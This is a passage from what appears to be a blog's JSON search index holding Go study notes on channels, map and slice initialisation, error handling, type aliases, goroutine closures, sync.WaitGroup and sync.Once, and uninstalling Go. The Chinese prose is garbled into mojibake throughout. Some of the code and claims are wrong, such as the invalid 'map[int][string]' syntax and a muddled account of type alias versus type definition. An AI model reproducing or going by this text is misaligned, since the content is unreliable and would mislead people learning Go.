çš„æ¥æ”¶å’Œå‘é€æ“ä½œæ˜¯åŒæ­¥çš„ï¼Œåªæœ‰åŒæ—¶å…·å¤‡æ¥æ”¶å’Œå‘é€èƒ½åŠ›æ‰ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ ä½¿ç”¨æœ‰ç¼“å†² channel æ—¶ï¼Œå› ä¸ºåœ¨ç¼“å†²å¸¦å·²ç©ºçš„æƒ…å†µä¸‹ï¼Œå¯¹å®ƒçš„æ‰€æœ‰æ¥æ”¶æ“ä½œéƒ½ä¼šè¢«é˜»å¡ï¼Œå› æ­¤æ•ˆæœä¸Šå’Œä½¿ç”¨æ— ç¼“å†² channel æ˜¯ä¸€æ ·çš„ã€‚ å½“æ²¡æœ‰æ–°çš„è¯·æ±‚è¿›æ¥æ—¶ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å¯¹ channel è¿›è¡Œå‘é€æ“ä½œï¼Œgoroutine ä¼šä¸€ç›´é˜»å¡åœ¨ url := &lt;-ch å¯¹ channel çš„æ¥æ”¶æ“ä½œä¸Šã€‚ ä¸€æ—¦æ–°çš„è¯·æ±‚è¿›æ¥äº†ï¼Œä¹Ÿå°±æ˜¯å¯¹ channel è¿›è¡Œå‘é€æ“ä½œäº†ï¼Œæ­¤æ—¶ goroutine é€šè¿‡æ¥æ”¶æ“ä½œæ‹¿åˆ°äº†æ•°æ®ï¼Œå› æ­¤ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ goroutine å†æ¬¡é‡æ–°è¿›å…¥ for å¾ªç¯ï¼Œé˜»å¡ç­‰å¾…ï¼Œé‡å¤ä¸Šé¢çš„é€»è¾‘ã€‚","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€é›¶æ•£å­¦ä¹ ç¬”è®°","slug":"go-language-study-notes","date":"2022-11-10T14:10:22.000Z","updated":"2023-02-18T03:28:33.599Z","comments":true,"path":"go-language-study-notes/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes/","excerpt":"Go è¯­è¨€å­¦ä¹ é›¶æ•£ç¬”è®°æ•´ç†ã€‚","text":"Go è¯­è¨€å­¦ä¹ é›¶æ•£ç¬”è®°æ•´ç†ã€‚ é›¶å€¼åˆå§‹åŒ–åŒæ ·æ˜¯å£°æ˜ä¸€ä¸ªåˆ‡ç‰‡ï¼Œè¿™ä¸¤ç§æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 12345// sl1 è¿™ä¸ªå˜é‡å£°æ˜äº†ï¼Œè¿˜æ²¡åˆå§‹åŒ–ï¼Œæ˜¯ nil å€¼ï¼Œå’Œnilæ¯”è¾ƒè¿”å›trueï¼Œåº•å±‚æ²¡æœ‰åˆ†é…å†…å­˜ç©ºé—´var sl1 []int // sl2 è¿™ä¸ªå˜é‡å£°æ˜ä¸”åˆå§‹åŒ–äº†ï¼Œä¸æ˜¯nilå€¼ï¼Œå’Œnilæ¯”è¾ƒè¿”å›falseï¼Œåº•å±‚åˆ†é…äº†å†…å­˜ç©ºé—´ï¼Œæœ‰åœ°å€var sl2 = []int&#123;&#125; åŒæ ·æ˜¯å£°æ˜ä¸€ä¸ª mapï¼Œè¿™ä¸¤ç§æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 12345678// å˜é‡ m1 åªæ˜¯å£°æ˜äº†ä½†æ˜¯æ²¡æœ‰åˆå§‹åŒ–ï¼Œé»˜è®¤å€¼ä¸º nilï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœç›´æ¥å¯¹ map è¿›è¡Œèµ‹å€¼ï¼Œåˆ™ä¼šå¯¼è‡´è¿è¡Œæ—¶å¼‚å¸¸var m1 map[int][string]// å˜é‡ m2 å£°æ˜ä¸”åˆå§‹åŒ–äº†m2 := map[int][string]&#123;&#125;// å¦ä¸€ç§åˆå§‹åŒ–æ–¹å¼m1 = make(map[int][string]) å› æ­¤åœ¨ä½¿ç”¨ map ä¹‹å‰ï¼Œå¿…é¡»å…ˆå¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ã€‚ å¼•ç”¨ç±»å‹Go è¯­è¨€çš„åŸºæœ¬æ•°æ®ç±»å‹ä¸­ï¼Œmapã€sliceã€channel è¿™äº›éƒ½æ˜¯å¼•ç”¨ç±»å‹ã€‚ å¼•ç”¨ç±»å‹çš„ç‰¹ç‚¹æ˜¯ï¼Œèµ‹å€¼æ—¶ï¼Œä¸æ˜¯å€¼ä¼ é€’è€Œæ˜¯å¼•ç”¨ä¼ é€’ã€‚ ä¸‹é¢é€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥ç†è§£ï¼š 1234567891011121314151617func main() &#123; m1 := make(map[int]int) m2 := make(map[int]int) m2 = m1 m1[1] = 99 for _, v := range m2 &#123; fmt.Println(v) &#125; var i1 int var i2 int i2 = i1 i1 = 99 fmt.Println(i2)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 12990 ç¬¦åˆé¢„æœŸã€‚ é”™è¯¯å¤„ç†é¦–å…ˆæ˜ç¡®ä¸€ä¸ªå‰æï¼šé”™è¯¯ä¸æ˜¯å¼‚å¸¸ã€‚ å¸¸è§çš„é”™è¯¯å¤„ç†æ–¹æ³•æ˜¯è¿”å› errorï¼Œç”±è°ƒç”¨è€…å†³å®šåç»­å¦‚ä½•å¤„ç†ã€‚ä½†æ˜¯å¦‚æœæ˜¯æ— æ³•æ¢å¤çš„é”™è¯¯ï¼Œé€šå¸¸ä¼šè§¦å‘ panicï¼Œç¨‹åºä¼šå› æ­¤è€Œæ— æ³•è¿è¡Œï¼Œè€Œè¿™ä¸ªå°±æ˜¯å¼‚å¸¸ã€‚ 123456789101112func main() &#123; err := M() if err != nil &#123; // do somethings fmt.Println(err.Error()) &#125;&#125;func M() error &#123; // ... ... return errors.New(\"some error occurred\")&#125; error æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒæ˜¯ Go åŸç”Ÿå†…ç½®çš„ç±»å‹ã€‚ errors æ˜¯ä¸€ä¸ªåŒ…æ–‡ä»¶ï¼Œé€šå¸¸ç”¨åˆ°å®ƒçš„ errors.New æ–¹æ³•ç”¨æ„é€ ä¸€ä¸ªé”™è¯¯å€¼ï¼Œèµ‹å€¼ç»™æ¥å£ã€‚å› æ­¤é€šå¸¸æŠŠ error ä½œä¸ºè¿”å›å€¼ç±»å‹ï¼Œerrors.New() ä½œä¸ºæ„é€  error ç±»å‹çš„è¿”å›å€¼çš„æ–¹å¼ä¹‹ä¸€ï¼Œfmt.Errorf() ä¹Ÿå¯ä»¥æ„é€ ã€‚ å®šä¹‰ä¸€ä¸ªæ–°ç±»å‹type T1 ï¼T å’Œ type T1 T ä¸¤ä¸ªè¯­æ³•æœ¬è´¨ä¸Šæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ å‰è€…æ˜¯åŸºäºç±»å‹åˆ«åï¼ˆType Aliasï¼‰å®šä¹‰æ–°ç±»å‹ï¼Œåè€…æ˜¯é€šè¿‡ç±»å‹å£°æ˜ï¼ˆType defineï¼‰ç»™åŸç±»å‹èµ·åˆ«åã€‚ 12345678// type aliastype T = string // ç±»å‹ T1 æ˜¯åŸºç¡€ç±»å‹ string çš„åˆ«åfunc main() &#123; var s string = \"hello\" var t T = s // ok fmt.Printf(\"%T\\n\", t) // string&#125; ç±»å‹ T ä¸ string å®Œå…¨ç­‰ä»·ã€‚å®Œå…¨ç­‰ä»·çš„æ„æ€å°±æ˜¯ï¼Œç±»å‹åˆ«åå¹¶æ²¡æœ‰å®šä¹‰å‡ºæ–°ç±»å‹ï¼Œç±» T ä¸ string å®é™…ä¸Šå°±æ˜¯åŒä¸€ç§ç±»å‹ï¼Œå› æ­¤é€šå¸¸ä¼šç§° ç±»å‹ T æ˜¯åŸºç¡€ç±»å‹ string çš„åˆ«åã€‚ 12345678910111213// type definetype T1 int // ç±»å‹ T1 æ˜¯åŸºç¡€ç±»å‹ int çš„æ–°ç±»å‹type T2 T1 // ç±»å‹ T1 æ˜¯è‡ªå®šä¹‰ç±»å‹ T1 çš„æ–°ç±»å‹type T3 string // ç±»å‹ T3 æ˜¯åŸºç¡€ç±»å‹ string çš„æ–°ç±»å‹func main() &#123; var n1 T1 var n2 T2 = 5 n1 = T1(n2) // ok var s T3 = \"hello\" n1 = T1(s) // é”™è¯¯ï¼šcannot convert s (type T3) to type T1&#125; è™½ç„¶ T1 å’Œ T2 æ˜¯ä¸åŒç±»å‹ï¼Œä½†å› ä¸ºå®ƒä»¬çš„åº•å±‚ç±»å‹éƒ½æ˜¯ç±»å‹ intï¼Œæ‰€ä»¥å®ƒä»¬åœ¨æœ¬è´¨ä¸Šæ˜¯ç›¸åŒçš„ã€‚è€Œæœ¬è´¨ä¸Šç›¸åŒçš„ä¸¤ä¸ªç±»å‹ï¼Œå®ƒä»¬çš„å˜é‡å¯ä»¥é€šè¿‡æ˜¾å¼è½¬å‹è¿›è¡Œç›¸äº’èµ‹å€¼ï¼Œç›¸åï¼Œå¦‚æœæœ¬è´¨ä¸Šæ˜¯ä¸åŒçš„ä¸¤ä¸ªç±»å‹ï¼Œå®ƒä»¬çš„å˜é‡é—´è¿æ˜¾å¼è½¬å‹éƒ½ä¸å¯èƒ½ï¼Œæ›´ä¸è¦è¯´ç›¸äº’èµ‹å€¼äº†ã€‚ åº•å±‚ç±»å‹è¿™ä¸ªæ¦‚å¿µåœ¨ Go è¯­è¨€ä¸­æœ‰é‡è¦ä½œç”¨ï¼Œé€šå¸¸è¢«ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªç±»å‹æœ¬è´¨ä¸Šæ˜¯å¦ç›¸åŒï¼ˆIdenticalï¼‰ã€‚ æ¥å£ç±»å‹ä¸èƒ½ä½¿ç”¨æŒ‡é’ˆä¸‹é¢è¿™æ ·çš„ä»£ç å¾ˆå¸¸è§ï¼Œé€šå¸¸ä½¿ç”¨ç¬¬ä¸‰æ–¹ä¾èµ–æ—¶ï¼Œç»å¸¸ä¼šå†™å‡ºè¿™æ ·çš„ä»£ç ã€‚å¯æ˜¯ï¼Œæœ‰æ²¡æœ‰æƒ³è¿‡ä¸€ä¸ªé—®é¢˜ï¼Ÿä¸ºä»€ä¹ˆ http.ResponseWriter æ˜¯æ²¡æœ‰å¸¦æŒ‡é’ˆçš„ï¼Œè€Œ *http.Request åˆå¸¦äº†æŒ‡é’ˆï¼Ÿ 12345678type Context struct &#123; Writer http.ResponseWriter Req *http.Request &#125;func indexHanlder(w http.ResponseWriter, req *http.Request) &#123; fmt.Fprintf(w, \"URL.Path = %q \\n\", req.URL.Path)&#125; è®°ä½ä¸€å¥è¯ï¼šä½¿ç”¨æŒ‡é’ˆå¯ä»¥èŠ‚çœå†…å­˜ï¼Œä½†æ¥å£ç±»å‹ä¸èƒ½ä½¿ç”¨æŒ‡é’ˆã€‚å› æ­¤å®šä¹‰ç»“æ„ä½“ã€ä½œä¸ºå‡½æ•°å‚æ•°æ—¶æ¥å£ç±»å‹éƒ½æ˜¯æ²¡æœ‰æŒ‡é’ˆçš„ï¼Œè€Œç»“æ„ä½“ç±»å‹åˆ™éœ€è¦ç»“åˆå®é™…æƒ…å†µè€ƒè™‘åŠ ä¸åŠ æŒ‡é’ˆã€‚ goroutine å…±äº«å˜é‡ä¸‹é¢è¿™æ®µä»£ç ï¼Œä½œä¸º goroutine è¿è¡Œçš„é—­åŒ…ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ 12345678910func main() &#123; values := []string&#123;\"a\", \"b\", \"c\"&#125; for _, v := range values &#123; go func() &#123; fmt.Println(v) &#125;() &#125; time.Sleep(1 * time.Second)&#125; åˆæ¬¡ä½¿ç”¨ goroutine æ—¶ï¼Œè‚¯å®šéƒ½é‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆå…¨éƒ¨è¾“å‡ºçš„æ˜¯ cã€cã€cï¼Ÿ è¿™æ˜¯å› ä¸ºå˜é‡ v æ˜¯ä¸€ä¸ªå…±äº«å˜é‡ï¼Œå­˜åœ¨ç«äº‰çŠ¶æ€ã€‚æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼šå°†å˜é‡ä½œä¸ºå‚æ•°ä¼ é€’ç»™é—­åŒ…å’Œä½¿ç”¨ä¸­é—´å˜é‡ã€‚ å°†å˜é‡ä½œä¸ºå‚æ•°ä¼ é€’ï¼š 12345for _, v := range values &#123; go func(u string) &#123; fmt.Println(u) &#125;(v)&#125; ä½¿ç”¨ä¸­é—´å˜é‡ï¼š 123456for _, v := range values &#123; v := v go func() &#123; fmt.Println(v) &#125;()&#125; å¦‚ä½•è°ƒè¯• Goå¦‚æœä½¿ç”¨ Goland ä½œä¸ºå¼€å‘å·¥å…·ï¼Œé‚£ä¹ˆ Go ç¨‹åºçš„è°ƒè¯•éå¸¸ç®€å•ï¼Œä¸éœ€è¦é¢å¤–å®‰è£…æ’ä»¶ï¼Œå¼€ç®±å³ç”¨ã€‚ åªéœ€è¦åœ¨å¯¹åº”æ–‡ä»¶ä½ç½®ï¼Œæ‰“ä¸Šæ–­ç‚¹å³å¯ã€‚ å¦‚æœä½¿ç”¨ VsCode ä½œä¸ºå¼€å‘å·¥å…·ï¼Œåˆ™éœ€è¦é€šè¿‡é¢å¤–å®‰è£…æ’ä»¶å¹¶é…ç½®è¾¾åˆ°è°ƒè¯•ç›®çš„ï¼Œæ‰€ä»¥å»ºè®®ç›´æ¥ä½¿ç”¨ IDEã€‚ ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦ä¸å¯¹åº”ç‰ˆæœ¬å¯¹åº”ä¸Šï¼Œå¦åˆ™æ˜¯è°ƒè¯•ä¸äº†çš„ã€‚ ä¾‹å¦‚ï¼ŒM1 èŠ¯ç‰‡ ä¸æ”¯æŒamd64ï¼Œå¦‚æœåˆšå¥½å®‰è£…çš„æ˜¯ darwin/amd64 ç‰ˆæœ¬ï¼Œåˆ™ä¼šæç¤ºï¼š Debugging programs compiled with go version go1.18.1 darwin/amd64 is not supported. è§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼Œç›´æ¥ä¸‹è½½å®‰è£… arm64 ç‰ˆæœ¬å³å¯ã€‚ å¦‚ä½•å¸è½½ Goå¸è½½å·²ç»æŒ‰ç…§å¥½çš„ Go éå¸¸ç®€å•ï¼Œé€šå¸¸åªéœ€è¦ä¸‰æ­¥ï¼š æ‰¾åˆ°Go äºŒè¿›åˆ¶æ–‡ä»¶çš„ä½ç½®ï¼Œé€šå¸¸æ˜¯ /usr/local/go 12$ which go/usr/local/go/bin/go åˆ é™¤GolangäºŒè¿›åˆ¶æ–‡ä»¶ 1sudo rm -rvf /usr/local/go/ ä» PATH ç¯å¢ƒå˜é‡ä¸­åˆ é™¤ Go äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨ç›®å½• å¦‚æœæ˜¯ macOSï¼Œåˆ™éœ€è¦å¤šä¸€æ­¥åˆ é™¤ /etc/paths.d/go æ–‡ä»¶ï¼š 1$ sudo rm -rvf /etc/paths.d/go è¯¦æƒ…å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”sync.WaitGroupå’Œsync.Once","slug":"go-language-study-notes-sync-Mutex-and-sync-WaitGroup-and-sync-Once","date":"2022-11-09T06:30:34.000Z","updated":"2023-02-18T03:28:33.596Z","comments":true,"path":"go-language-study-notes-sync-Mutex-and-sync-WaitGroup-and-sync-Once/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-sync-Mutex-and-sync-WaitGroup-and-sync-Once/","excerpt":"è¿™ç¯‡ç¬”è®°ä¸»è¦ç”¨æ¥ä»‹ç» Go çš„sync åŒ…çš„ WaitGroup ç±»å‹ï¼Œå®ƒä¹Ÿæ˜¯å¹¶å‘ç¼–ç¨‹ä¸­ï¼Œç»å¸¸è¢«ç”¨åˆ°çš„ä¸€ä¸ªåŒæ­¥å·¥å…·ã€‚","text":"è¿™ç¯‡ç¬”è®°ä¸»è¦ç”¨æ¥ä»‹ç» Go çš„sync åŒ…çš„ WaitGroup ç±»å‹ï¼Œå®ƒä¹Ÿæ˜¯å¹¶å‘ç¼–ç¨‹ä¸­ï¼Œç»å¸¸è¢«ç”¨åˆ°çš„ä¸€ä¸ªåŒæ­¥å·¥å…·ã€‚ WaitGroupç±»å‹sync åŒ…çš„ WaitGroup ç±»å‹ï¼ˆä»¥ä¸‹ç®€ç§°WaitGroupç±»å‹ï¼‰ï¼Œé€šå¸¸ç”¨æ¥å®ç°ä¸€å¯¹ä¸€æˆ–è€…ä¸€å¯¹å¤šçš„ goroutine åä½œæµç¨‹ã€‚ WaitGroupç±»å‹ï¼Œä¹Ÿæ˜¯é›¶å€¼æ˜¯å¯ç”¨çš„ï¼Œå› æ­¤ä¸éœ€è¦åˆå§‹åŒ–ï¼Œå¼€ç®±å³ç”¨ã€‚ å¯ä»¥æŠŠ WaitGroup ç±»å‹ç†è§£æˆæ˜¯ä¸€ä¸ªè®¡æ•°ä¿¡å·é‡ï¼Œç”¨æ¥è®°å½•å¹¶ç»´æŠ¤è¿è¡Œçš„ goroutineã€‚ WaitGroupç±»å‹æ‹¥æœ‰ä¸‰ä¸ªæŒ‡é’ˆæ–¹æ³•ï¼š Addï¼šå¯¹ WaitGroup ç±»å‹å€¼çš„å¢åŠ æˆ–è€…å‡å°‘è®¡æ•°å™¨çš„å€¼ Doneï¼šç­‰å¾… goroutine æ‰§è¡Œå®Œæˆé€šçŸ¥ main goroutine Waitï¼šé˜»å¡å½“å‰çš„ goroutineï¼Œç›´åˆ°å…¶æ‰€å±å€¼ä¸­çš„è®¡æ•°å™¨å½’é›¶ ä¸‹é¢é€šè¿‡ä¸€æ®µç¤ºä¾‹ä»£ç æ¥åŠ æ·±å°è±¡ï¼š 1234567891011121314151617181920212223242526// å£°æ˜ä¸€ä¸ª WaitGroup ç±»å‹çš„å˜é‡var wg sync.WaitGroupfunc worker(id int) &#123; fmt.Printf(\"Worker %d starting\\n\", id) time.Sleep(time.Second) fmt.Printf(\"Worker %d done\\n\", id)&#125;func main() &#123; // æ˜¾ç¤º Add æ–¹æ³•ï¼Œè®¡æ•°å™¨å¢åŠ  5 wg.Add(5) for i := 1; i &lt;= 5; i++ &#123; // åˆ›å»ºä¸­é—´å˜é‡ï¼Œé¿å…åœ¨æ¯ä¸ªåç¨‹é—­åŒ…ä¸­é‡å¤åˆ©ç”¨ç›¸åŒçš„ i å€¼ i := i go func() &#123; // é€šçŸ¥ WaitGroup æ­¤å·¥ä½œçº¿ç¨‹å·²æ‰§è¡Œå®Œæˆ defer wg.Done() worker(i) &#125;() &#125; // é˜»å¡ï¼Œç›´åˆ° WaitGroup è®¡æ•°å™¨æ¢å¤ä¸º 0ï¼› å³æ‰€æœ‰goroutine éƒ½æ‰§è¡Œå®Œäº† wg.Wait()&#125; é¦–å…ˆå£°æ˜ä¸€ä¸ªå…¨å±€ WaitGroup ç±»å‹çš„å˜é‡ï¼Œåœ¨æ‰§è¡Œ for è¯­å¥ä¹‹å‰ï¼Œæ˜¾ç¤ºè°ƒç”¨ Add æ–¹æ³•ï¼Œè®¡æ•°å™¨å¢åŠ  5ï¼Œè¡¨ç¤ºæœ‰äº”ä¸ªå³å°†è¿è¡Œçš„ goroutineã€‚ åœ¨ for è¯­å¥ä¸­ï¼Œæ¯æ¬¡å¾ªç¯â€åˆ›å»ºâ€ä¸€ä¸ªgoroutineï¼Œä¸€å…±åˆ›å»ºäº”ä¸ªã€‚ å¦‚æœ WaitGroup çš„å€¼å¤§äº 0ï¼ŒWait æ–¹æ³•å°±ä¼šé˜»å¡ï¼Œå› æ­¤ main goroutine å°±ç®—å…ˆæ‰§è¡Œå®Œæˆï¼Œä¹Ÿä¸èƒ½é©¬ä¸Šé€€å‡ºç¨‹åºï¼Œå¿…é¡»ç­‰å¾… WaitGroup è®¡æ•°å™¨æ¢å¤ä¸º 0ã€‚ ä¸€èˆ¬ä¼šåœ¨ goroutine ä¸­ï¼Œé…åˆä½¿ç”¨ defer è°ƒç”¨ Doneæ–¹æ³•ï¼Œä¼šä¿è¯æ¯ä¸ª goroutine ä¸€æ—¦æ‰§è¡Œå®Œæˆï¼Œå°±è°ƒç”¨ Done æ–¹æ³•ï¼Œé€šçŸ¥ WaitGroup è¯¥ goroutine å·²æ‰§è¡Œå®Œæˆã€‚ ä¸€æ—¦ WaitGroup è®¡æ•°å˜ä¸ºé›¶ï¼Œmain goroutine å°±ä¸ä¼šè¢«é˜»å¡ï¼Œä»è€Œç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œç¨‹åºé€€å‡ºç»“æŸã€‚ æ‰§è¡Œä¸€ä¸‹ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œçœ‹çœ‹è¾“å‡ºæ˜¯å¦ç¬¦åˆé¢„æœŸï¼š 12345678910Worker 5 startingWorker 3 startingWorker 4 startingWorker 1 startingWorker 2 startingWorker 4 doneWorker 1 doneWorker 2 doneWorker 5 doneWorker 3 done ç¬¦åˆé¢„æœŸï¼Œmain goroutine ç¡®å®è¢«é˜»å¡äº†ï¼Œç›´åˆ°å…¶ä»– goroutine éƒ½æ‰§è¡Œå®Œäº†ã€‚ å¼•å‘ panic çš„æƒ…å†µWaitGroup è™½ç„¶æ˜¯å¼€ç®±å³ç”¨å’Œå¹¶å‘å®‰å…¨çš„ï¼Œä½†ä½¿ç”¨æ—¶ä¹Ÿè¦æ³¨æ„å‡ ç‚¹åŸåˆ™ï¼Œä¸ç„¶å¯èƒ½å°±å¼•å‘ panic äº†ã€‚ ä¸é€‚å½“åœ°è°ƒç”¨ WaitGroup çš„ Done æ–¹æ³•å’Œ Add æ–¹æ³•éƒ½å¯èƒ½ä¼šå¯¼è‡´è®¡æ•°å™¨çš„å€¼å°äºé›¶ï¼Œä»è€Œå¼•å‘ panicï¼š 1panic: sync: negative WaitGroup counter Add æ–¹æ³•æ¯”è¾ƒå¥½ç†è§£ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥ä¼ å…¥è´Ÿæ•°ã€‚ å¦å¤–å°±æ˜¯ Add æ–¹æ³•çš„è°ƒç”¨ï¼Œå’Œå¯¹ Wait æ–¹æ³•çš„è°ƒç”¨å¦‚æœæ˜¯åŒæ—¶å‘èµ·çš„ï¼Œæ¯”å¦‚ï¼Œæ”¾åœ¨ä¸åŒçš„ goroutine ä¸­å¹¶å‘æ‰§è¡Œï¼Œé‚£ä¹ˆä¹Ÿæœ‰å¯èƒ½ä¼šå¼•å‘ panicã€‚ è™½ç„¶è¿™ç§æƒ…å†µä¸å¤ªå®¹æ˜“å¤ç°ï¼Œå› æ­¤æ›´åŠ éœ€è¦é‡è§†ã€‚ sync.Onceä¸sync.WaitGroupç±»å‹ä¸€æ ·ï¼Œsync.Onceç±»å‹ï¼ˆä»¥ä¸‹ç®€ç§°Onceç±»å‹ï¼‰ä¹Ÿå±äºç»“æ„ä½“ç±»å‹ï¼ŒåŒæ ·ä¹Ÿæ˜¯å¼€ç®±å³ç”¨å’Œå¹¶å‘å®‰å…¨çš„ã€‚ç”±äºè¿™ä¸ªç±»å‹ä¸­åŒ…å«äº†ä¸€ä¸ªsync.Mutexç±»å‹çš„å­—æ®µï¼Œæ‰€ä»¥ï¼Œå¤åˆ¶è¯¥ç±»å‹çš„å€¼ä¹Ÿä¼šå¯¼è‡´åŠŸèƒ½çš„å¤±æ•ˆã€‚ Onceç±»å‹çš„ Do æ–¹æ³•åªæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°çš„ç±»å‹å¿…é¡»æ˜¯func()ï¼Œå³ï¼šæ— å‚æ•°å£°æ˜å’Œç»“æœå£°æ˜çš„å‡½æ•°ã€‚ è¯¥æ–¹æ³•çš„åŠŸèƒ½å¹¶ä¸æ˜¯å¯¹æ¯ä¸€ç§å‚æ•°å‡½æ•°éƒ½åªæ‰§è¡Œä¸€æ¬¡ï¼Œè€Œæ˜¯åªæ‰§è¡Œâ€œé¦–æ¬¡è¢«è°ƒç”¨æ—¶ä¼ å…¥çš„â€é‚£ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”ä¹‹åä¸ä¼šå†æ‰§è¡Œä»»ä½•å‚æ•°å‡½æ•°ã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰å¤šä¸ªåªéœ€è¦æ‰§è¡Œä¸€æ¬¡çš„å‡½æ•°ï¼Œé‚£ä¹ˆå°±åº”è¯¥ä¸ºå®ƒä»¬ä¸­çš„æ¯ä¸€ä¸ªéƒ½åˆ†é…ä¸€ä¸ªsync.Onceç±»å‹çš„å€¼ï¼ˆä»¥ä¸‹ç®€ç§°Onceå€¼ï¼‰ã€‚ sync.Once é€šå¸¸ç”¨äºåˆå§‹åŒ–åˆ›å»ºå®ä¾‹ç­‰åœºæ™¯ã€‚ 123456789var once sync.Oncevar Redis *RedisClientfunc ConnectRedis(address string, username string, password string, db int) &#123; once.Do(func() &#123; Redis = NewClient(address, username, password, db) &#125;)&#125; Onceç±»å‹ä¸­æœ‰ä¸€ä¸ªåå« done çš„ uint32 ç±»å‹çš„å­—æ®µã€‚å®ƒçš„ä½œç”¨æ˜¯è®°å½•å…¶æ‰€å±å€¼çš„Do æ–¹æ³•è¢«è°ƒç”¨çš„æ¬¡æ•°ã€‚ Do æ–¹æ³•åœ¨åŠŸèƒ½æ–¹é¢æœ‰ä¸¤ä¸ªç‰¹ç‚¹ï¼š ç”±äºDo æ–¹æ³•åªä¼šåœ¨å‚æ•°å‡½æ•°æ‰§è¡Œç»“æŸä¹‹åæŠŠdoneå­—æ®µçš„å€¼å˜ä¸º1ï¼Œå› æ­¤ï¼Œå¦‚æœå‚æ•°å‡½æ•°çš„æ‰§è¡Œéœ€è¦å¾ˆé•¿æ—¶é—´æˆ–è€…æ ¹æœ¬å°±ä¸ä¼šç»“æŸï¼ˆæ¯”å¦‚æ‰§è¡Œä¸€äº›å®ˆæŠ¤ä»»åŠ¡ï¼‰ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ä¼šå¯¼è‡´ç›¸å…³ goroutine çš„åŒæ—¶é˜»å¡ã€‚ Doæ–¹æ³•åœ¨å‚æ•°å‡½æ•°æ‰§è¡Œç»“æŸåï¼Œå¯¹done å­—æ®µçš„èµ‹å€¼ç”¨çš„æ˜¯åŸå­æ“ä½œï¼Œå¹¶ä¸”ï¼Œè¿™ä¸€æ“ä½œæ˜¯è¢«æŒ‚åœ¨defer è¯­å¥ä¸­çš„ã€‚å› æ­¤ï¼Œä¸è®ºå‚æ•°å‡½æ•°çš„æ‰§è¡Œä¼šä»¥æ€æ ·çš„æ–¹å¼ç»“æŸï¼Œdoneå­—æ®µçš„å€¼éƒ½ä¼šå˜ä¸º1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿è¿™ä¸ªå‚æ•°å‡½æ•°æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼ˆæ¯”å¦‚å¼•å‘äº†ä¸€ä¸ª panicï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•ä½¿ç”¨åŒä¸€ä¸ªOnceå€¼é‡æ–°æ‰§è¡Œå®ƒäº†ã€‚ æ€»ç»“ sync ä»£ç åŒ…çš„ WaitGroup ç±»å‹å’Œ Once ç±»å‹éƒ½æ˜¯éå¸¸æ˜“ç”¨çš„åŒæ­¥å·¥å…·ï¼Œå®ƒä»¬éƒ½æ˜¯å¼€ç®±å³ç”¨å’Œå¹¶å‘å®‰å…¨çš„ ä½¿ç”¨ WaitGroup æ—¶ï¼Œåº”é¿å…å‡ºç°è®¡æ•°å™¨çš„å€¼å°äº0 çš„æƒ…å†µï¼Œå¦åˆ™ä¼šå¼•å‘ panic ä½¿ç”¨ WaitGroup æ—¶ï¼Œåº”éµå¾ª â€œå…ˆç»Ÿä¸€Addï¼Œå†å¹¶å‘Doneï¼Œæœ€åWaitâ€ è¿™ç§æ ‡å‡†æ–¹å¼ï¼Œä¸è¦åœ¨è°ƒç”¨Wait æ–¹æ³•çš„åŒæ—¶ï¼Œå¹¶å‘åœ°é€šè¿‡è°ƒç”¨Add æ–¹æ³•å»å¢åŠ å…¶è®¡æ•°å™¨çš„å€¼ï¼Œå› ä¸ºè¿™ä¹Ÿæœ‰å¯èƒ½å¼•å‘ panic å‚è€ƒé“¾æ¥ Go è¯­è¨€æ ¸å¿ƒ 36 è®²","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”sync.Mutexä¸sync","slug":"go-language-study-notes-sync-Mutex-and-sync","date":"2022-11-08T15:33:41.000Z","updated":"2023-02-18T03:28:33.597Z","comments":true,"path":"go-language-study-notes-sync-Mutex-and-sync/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-sync-Mutex-and-sync/","excerpt":"è¿™ç¯‡ç¬”è®°ä¸»è¦æ¥ä»‹ç» Go 